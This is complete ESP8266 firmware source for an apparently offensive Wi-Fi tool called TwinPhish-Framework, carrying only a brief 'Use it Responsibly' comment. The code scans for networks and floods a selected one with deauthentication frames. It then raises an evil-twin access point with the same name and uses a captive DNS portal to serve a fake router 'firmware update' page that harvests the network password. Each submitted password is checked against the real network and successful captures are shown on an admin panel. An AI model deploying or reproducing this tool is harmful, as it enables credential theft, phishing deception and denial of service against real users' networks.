// TwinPhish-Framework Built By: Abinash Barik
// Use it Responsibly
// Remember: In the digital world, every connection leaves a trace, and you can never truly hide.
#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>

extern "C" {
#include "user_interface.h"
}

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

// Default main strings
#define SUBTITLE "ACCESS POINT RESCUE MODE"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."

String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "article { background: rgba(0, 0, 0, 0.7); padding: 1.3em; border: 2px solid #00ff00; }"
               "body { color: #00ff00; font-family: 'Courier New', monospace; font-size: 18px; line-height: 24px; margin: 0; padding: 0; "
               "background: linear-gradient(135deg, #0a0a0a 0%, #1a0033 25%, #000033 50%, #1a0033 75%, #0a0a0a 100%); "
               "background-attachment: fixed; background-size: 400% 400%; text-shadow: 0 0 10px #00ff00; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw; color: #ff00ff; text-shadow: 0 0 20px #ff00ff; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 5px; border: 2px solid #00ff00; "
               "background: rgba(0, 0, 0, 0.8); color: #00ff00; font-family: 'Courier New', monospace; text-shadow: 0 0 5px #00ff00; }"
               "input:focus { outline: none; border: 2px solid #ff00ff; box-shadow: 0 0 10px #ff00ff; }"
               "label { color: #00ffff; display: block; font-style: italic; font-weight: bold; text-shadow: 0 0 10px #00ffff; }"
               "nav { background: linear-gradient(90deg, #0a0a0a, #1a001a, #0a0a0a); color: #00ff00; display: block; font-size: 1.3em; padding: 1em; "
               "border-bottom: 3px solid #ff00ff; box-shadow: 0 0 15px #ff00ff; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; color: #ff00ff; text-shadow: 0 0 10px #ff00ff; } "
               "textarea { width: 100%; background: rgba(0, 0, 0, 0.8); color: #00ff00; border: 2px solid #00ff00; font-family: 'Courier New', monospace; }"
               ".footer-credit { text-align: center; padding: 15px; color: #00ffff; font-size: 12px; text-shadow: 0 0 5px #00ffff; border-top: 2px solid #ff00ff; margin-top: 20px; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title><center>"
             + a + " :: " + t + "</center></title>"
                                "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
                                "<style>"
             + CSS + "</style>"
                     "<meta charset=\"UTF-8\"></head>"
                     "<body><nav><b>"
             + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String footer() {
  return "</div><div class=footer-credit>&#169; Developed by: Abinash Barik | All rights reserved.</div>";
}

String index() {
  String realistic_style = "<!DOCTYPE html><html><head>"
                           "<meta charset='UTF-8'>"
                           "<meta name='viewport' content='width=device-width, initial-scale=1'>"
                           "<style>"
                           "* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }"
                           "body { background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }"
                           ".container { background: #ffffff; border: 1px solid #d1d5db; border-radius: 6px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); max-width: 480px; width: 100%; padding: 35px; }"
                           ".header { border-bottom: 2px solid #0056b3; padding-bottom: 15px; margin-bottom: 20px; text-align: center; }"
                           ".header h1 { color: #333333; font-size: 22px; font-weight: 600; margin-top: 10px; }"
                           ".warning-icon { font-size: 42px; color: #f59e0b; line-height: 1; }"
                           ".content p { color: #4b5563; font-size: 14px; line-height: 1.6; margin-bottom: 15px; }"
                           ".progress-bar { width: 100%; height: 12px; background-color: #e5e7eb; border-radius: 6px; overflow: hidden; margin: 20px 0; }"
                           ".progress-fill { height: 100%; background-color: #0056b3; width: 65%; animation: load 2.5s infinite; }"
                           "@keyframes load { 0% { width: 0%; } 50% { width: 65%; } 100% { width: 100%; } }"
                           ".info-box { background: #fffbeb; border-left: 4px solid #f59e0b; padding: 12px; margin: 15px 0; font-size: 13px; color: #92400e; }"
                           ".form-group { margin-bottom: 18px; text-align: left; }"
                           ".form-group label { display: block; margin-bottom: 6px; color: #374151; font-size: 14px; font-weight: 600; }"
                           ".form-group input { width: 100%; padding: 10px 12px; border: 1px solid #d1d5db; border-radius: 4px; font-size: 14px; transition: border-color 0.2s; }"
                           ".form-group input:focus { outline: none; border-color: #0056b3; box-shadow: 0 0 0 2px rgba(0,86,179,0.1); }"
                           ".submit-btn { width: 100%; padding: 12px; background-color: #0056b3; color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer; transition: background-color 0.2s; }"
                           ".submit-btn:hover { background-color: #004494; }"
                           ".footer { margin-top: 25px; text-align: center; font-size: 12px; color: #6b7280; border-top: 1px solid #e5e7eb; padding-top: 15px; }"
                           ".danger-text { color: #dc2626; font-weight: 600; margin-top: 5px; display: block; }"
                           "</style></head><body>"
                           "<div class='container'>"
                           "<div class='header'><div class='warning-icon'>&#9888;</div><h1>Firmware Update Required</h1></div>"
                           "<div class='content'>"
                           "<p>Your router is running an outdated firmware version. A critical update is required to maintain network security and performance.</p>"
                           "<div class='progress-bar'><div class='progress-fill'></div></div>"
                           "<div class='info-box'><strong>Notice:</strong> Auto-resuming in 30 seconds...</div>"
                           "<form method='post'>"
                           "<div class='form-group'><label for='password'>Router Admin Password:</label>"
                           "<input type='password' id='password' name='password' placeholder='Enter password' required autofocus></div>"
                           "<button type='submit' class='submit-btn'>Authenticate & Update</button>"
                           "</form></div>"
                           "<div class='footer'>This is a mandatory security update. Your device will restart automatically.<span class='danger-text'>Do not disconnect your router during this process.</span></div>"
                           "</div></body></html>";
  return realistic_style;
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("TwinPhish-Framework ", "TwinPhish@123");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    }

    String result_html = "<!DOCTYPE html><html><head>"
                         "<meta charset='UTF-8'>"
                         "<meta name='viewport' content='width=device-width, initial-scale=1'>"
                         "<style>"
                         "* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }"
                         "body { background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; text-align: center; }"
                         ".container { background: #ffffff; border: 1px solid #d1d5db; border-radius: 6px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); max-width: 480px; width: 100%; padding: 35px; }"
                         ".header { border-bottom: 2px solid #dc2626; padding-bottom: 15px; margin-bottom: 20px; }"
                         ".header h1 { color: #333333; font-size: 22px; font-weight: 600; margin-top: 10px; }"
                         ".error-icon { font-size: 42px; color: #dc2626; line-height: 1; }"
                         ".content p { color: #4b5563; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }"
                         ".back-btn { display: inline-block; width: 100%; padding: 12px; background-color: #0056b3; color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer; text-decoration: none; transition: background-color 0.2s; box-sizing: border-box; }"
                         ".back-btn:hover { background-color: #004494; }"
                         ".footer { margin-top: 25px; font-size: 12px; color: #6b7280; border-top: 1px solid #e5e7eb; padding-top: 15px; }"
                         "</style></head><body>"
                         "<div class='container'>"
                         "<div class='header'><div class='error-icon'>&#10006;</div><h1>Authentication Failed</h1></div>"
                         "<div class='content'>"
                         "<p>The password provided is incorrect. The firmware update cannot proceed without proper authentication.</p>"
                         "<a href='/' class='back-btn'>Try Again</a>"
                         "</div>"
                         "</div></body></html>";

    webServer.send(200, "text/html", result_html);
    Serial.println("Wrong password tried!");
  } else {
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect(true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("TwinPhish-Framework ", "TwinPhish@123");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}

String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> "
                   "body { background: linear-gradient(135deg, #0a0a0a 0%, #1a0033 25%, #000033 50%, #1a0033 75%, #0a0a0a 100%); "
                   "color: #00ff00; font-family: 'Courier New', monospace; margin: 0; padding: 10px; text-shadow: 0 0 10px #00ff00; }"
                   ".content { max-width: 500px; margin: auto; }"
                   "table, th, td { border: 2px solid #00ff00; border-collapse: collapse; padding: 10px; background: rgba(0, 0, 0, 0.8); color: #00ff00; text-shadow: 0 0 5px #00ff00; }"
                   "th { background: linear-gradient(90deg, #1a0033, #330033); color: #ff00ff; text-shadow: 0 0 10px #ff00ff; }"
                   "button { padding: 10px 20px; margin: 5px; background: rgba(0, 0, 0, 0.9); color: #00ff00; border: 2px solid #00ff00; cursor: pointer; "
                   "font-family: 'Courier New', monospace; text-shadow: 0 0 5px #00ff00; transition: all 0.3s; }"
                   "button:hover { background: #00ff00; color: #000; box-shadow: 0 0 20px #00ff00; text-shadow: none; }"
                   "button:disabled { opacity: 0.5; cursor: not-allowed; }"
                   ".footer-credit { text-align: center; padding: 15px; color: #00ffff; font-size: 12px; text-shadow: 0 0 5px #00ffff; border-top: 2px solid #ff00ff; margin-top: 20px; }"
                   "form { display: inline-block; }"
                   "</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("TwinPhish-Framework ", "TwinPhish@123");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #00ff00; color: #000; text-shadow: none; font-weight: bold;'>SELECTED</button></form></td></tr>";
      } else {
        _html += "<button>SELECT</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }

    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "<div class=footer-credit>&#169; Developed by: Abinash Barik</div></div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      if (webServer.arg("deauth") == "start") {
        deauthing_active = false;
      }
      delay(1000);
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);

      String redirect_html = "<!DOCTYPE html><html><head>"
                             "<meta charset='UTF-8'>"
                             "<meta name='viewport' content='width=device-width, initial-scale=1'>"
                             "<script>setTimeout(function(){window.location.href = '/result';}, 15000);</script>"
                             "<style>"
                             "* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }"
                             "body { background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; text-align: center; }"
                             ".container { background: #ffffff; border: 1px solid #d1d5db; border-radius: 6px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); max-width: 480px; width: 100%; padding: 35px; }"
                             ".header { border-bottom: 2px solid #0056b3; padding-bottom: 15px; margin-bottom: 20px; }"
                             ".header h1 { color: #333333; font-size: 22px; font-weight: 600; margin-top: 10px; }"
                             ".spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0056b3; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }"
                             "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
                             ".content p { color: #4b5563; font-size: 14px; line-height: 1.6; margin-bottom: 15px; }"
                             ".footer { margin-top: 25px; font-size: 12px; color: #6b7280; border-top: 1px solid #e5e7eb; padding-top: 15px; }"
                             ".danger-text { color: #dc2626; font-weight: 600; margin-top: 5px; display: block; }"
                             "</style></head><body>"
                             "<div class='container'>"
                             "<div class='header'><div class='spinner'></div><h1>Verifying Integrity...</h1></div>"
                             "<div class='content'><p>Please wait while the system verifies your credentials and prepares the update.</p></div>"
                             "<div class='footer'><span class='danger-text'>Do not disconnect your router during this process.</span></div>"
                             "</div></body></html>";

      webServer.send(200, "text/html", redirect_html);

      if (webServer.arg("deauth") == "start") {
        deauthing_active = true;
      }
    } else {
      webServer.send(200, "text/html", index());
    }
  }
}

void handleAdmin() {
  String _html = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                 "<style> "
                 "body { background: linear-gradient(135deg, #0a0a0a 0%, #1a0033 25%, #000033 50%, #1a0033 75%, #0a0a0a 100%); "
                 "color: #00ff00; font-family: 'Courier New', monospace; margin: 0; padding: 20px; text-shadow: 0 0 10px #00ff00; }"
                 ".admin-container { max-width: 600px; margin: auto; border: 3px solid #ff00ff; border-radius: 10px; padding: 25px; "
                 "background: rgba(0, 0, 0, 0.9); box-shadow: 0 0 30px #ff00ff; }"
                 ".admin-title { text-align: center; font-size: 2em; color: #ff00ff; text-shadow: 0 0 20px #ff00ff; margin-bottom: 20px; border-bottom: 2px solid #ff00ff; padding-bottom: 10px; }"
                 ".admin-section { margin: 20px 0; padding: 15px; background: rgba(255, 0, 255, 0.05); border-left: 4px solid #ff00ff; }"
                 ".section-title { color: #00ffff; font-size: 1.3em; text-shadow: 0 0 10px #00ffff; margin-bottom: 10px; }"
                 "table, th, td { border: 2px solid #00ff00; border-collapse: collapse; padding: 10px; background: rgba(0, 0, 0, 0.8); color: #00ff00; text-shadow: 0 0 5px #00ff00; width: 100%; }"
                 "th { background: linear-gradient(90deg, #1a0033, #330033); color: #ff00ff; text-shadow: 0 0 10px #ff00ff; }"
                 "button { padding: 12px 25px; margin: 8px; background: rgba(0, 0, 0, 0.9); color: #00ff00; border: 2px solid #00ff00; cursor: pointer; "
                 "font-family: 'Courier New', monospace; text-shadow: 0 0 5px #00ff00; transition: all 0.3s; border-radius: 5px; font-weight: bold; }"
                 "button:hover { background: #00ff00; color: #000; box-shadow: 0 0 20px #00ff00; text-shadow: none; }"
                 "button:disabled { opacity: 0.5; cursor: not-allowed; }"
                 ".status-box { padding: 15px; background: rgba(0, 255, 0, 0.1); border: 2px solid #00ff00; border-radius: 5px; margin: 15px 0; }"
                 ".status-label { color: #00ffff; font-weight: bold; text-shadow: 0 0 5px #00ffff; }"
                 ".status-value { color: #00ff00; font-size: 1.1em; text-shadow: 0 0 5px #00ff00; }"
                 ".danger { color: #ff0000; text-shadow: 0 0 10px #ff0000; }"
                 ".success { color: #00ff00; text-shadow: 0 0 10px #00ff00; }"
                 ".warning { color: #ffff00; text-shadow: 0 0 10px #ffff00; }"
                 ".info { color: #00ffff; text-shadow: 0 0 10px #00ffff; }"
                 ".footer-credit { text-align: center; padding: 20px; color: #00ffff; font-size: 12px; text-shadow: 0 0 5px #00ffff; border-top: 2px solid #ff00ff; margin-top: 20px; }"
                 "form { display: inline-block; }"
                 ".control-buttons { text-align: center; margin: 20px 0; }"
                 "</style>"
                 "</head><body><div class='admin-container'><div class='admin-title'>⚙️ ADMIN CONTROL PANEL</div>";

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("TwinPhish-Framework ", "TwinPhish@123");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  // Status Information Section
  _html += "<div class='admin-section'><div class='section-title'>📊 SYSTEM STATUS</div>";

  if (hotspot_active) {
    _html += "<div class='status-box'><div class='status-label'>Evil Twin Status:</div><div class='status-value success'>● ACTIVE</div></div>";
  } else {
    _html += "<div class='status-box'><div class='status-label'>Evil Twin Status:</div><div class='status-value danger'>● INACTIVE</div></div>";
  }

  if (deauthing_active) {
    _html += "<div class='status-box'><div class='status-label'>Deauth Status:</div><div class='status-value success'>● ACTIVE</div></div>";
  } else {
    _html += "<div class='status-box'><div class='status-label'>Deauth Status:</div><div class='status-value danger'>● INACTIVE</div></div>";
  }

  if (_selectedNetwork.ssid != "") {
    _html += "<div class='status-box'><div class='status-label'>Target Network:</div><div class='status-value info'>" + _selectedNetwork.ssid + "</div></div>";
  } else {
    _html += "<div class='status-box'><div class='status-label'>Target Network:</div><div class='status-value warning'>No target selected</div></div>";
  }
  _html += "</div>";

  // Control Buttons Section
  _html += "<div class='admin-section'><div class='section-title'>🎮 MODULE CONTROLS</div>";
  _html += "<div class='control-buttons'>";

  if (deauthing_active) {
    _html += "<form style='display:inline-block;' method='post' action='/?deauth=stop'><button>⏹️ STOP DEAUTHING</button></form>";
  } else {
    _html += "<form style='display:inline-block;' method='post' action='/?deauth=start'>";
    if (_selectedNetwork.ssid == "") {
      _html += "<button disabled>▶️ START DEAUTHING</button>";
    } else {
      _html += "<button>▶️ START DEAUTHING</button>";
    }
    _html += "</form>";
  }

  if (hotspot_active) {
    _html += "<form style='display:inline-block;' method='post' action='/?hotspot=stop'><button>⏹️ STOP EVIL TWIN</button></form>";
  } else {
    _html += "<form style='display:inline-block;' method='post' action='/?hotspot=start'>";
    if (_selectedNetwork.ssid == "") {
      _html += "<button disabled>▶️ START EVIL TWIN</button>";
    } else {
      _html += "<button>▶️ START EVIL TWIN</button>";
    }
    _html += "</form>";
  }
  _html += "</div></div>";

  // Network Selection Section
  _html += "<div class='admin-section'><div class='section-title'>🌐 AVAILABLE NETWORKS</div>";
  _html += "<table><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>ACTION</th></tr>";

  for (int i = 0; i < 16; ++i) {
    if (_networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td style='font-size:0.8em;'>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "</td><td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

    if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #00ff00; color: #000;'>✓ SELECTED</button></form></td></tr>";
    } else {
      _html += "<button>SELECT</button></form></td></tr>";
    }
  }

  _html += "</table></div>";

  if (_correct != "") {
    _html += "<div class='admin-section' style='background: rgba(0, 255, 0, 0.15); border-left: 4px solid #00ff00;'><div class='status-label success'>✓ " + _correct + "</div></div>";
  }

  _html += "<div class=footer-credit>&#169; Developed by: Abinash Barik | Admin Panel v1.0</div></div></body></html>";
  webServer.send(200, "text/html", _html);
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {
    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = { 0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00 };

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}
